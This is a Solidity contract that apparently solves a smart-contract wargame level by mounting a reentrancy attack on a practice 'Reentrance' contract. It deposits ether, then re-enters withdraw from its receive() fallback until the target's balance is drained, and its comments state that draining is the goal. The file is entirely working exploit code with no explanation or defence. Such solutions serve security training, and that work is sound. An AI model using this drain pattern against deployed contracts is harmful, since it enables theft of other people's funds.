// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract Level10 {
    Reentrance reentrance;

    constructor(address payable reentranceAddr) public {
        reentrance = Reentrance(reentranceAddr);
    }

    function main() external payable {
        require(msg.value > 0, "Must send nonzero value");

        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    // Receive function called in `withdraw`
    receive() external payable {
        uint256 individualBalance = reentrance.balanceOf(address(this));
        uint256 totalBalance = address(reentrance).balance;

        // We've drained the contract and we're done
        if (totalBalance == 0) {
            return;
        }

        // We can withdraw the rest of the funds
        if (individualBalance > totalBalance) {
            reentrance.withdraw(totalBalance);
            return;
        }

        reentrance.withdraw(individualBalance);
    }
}
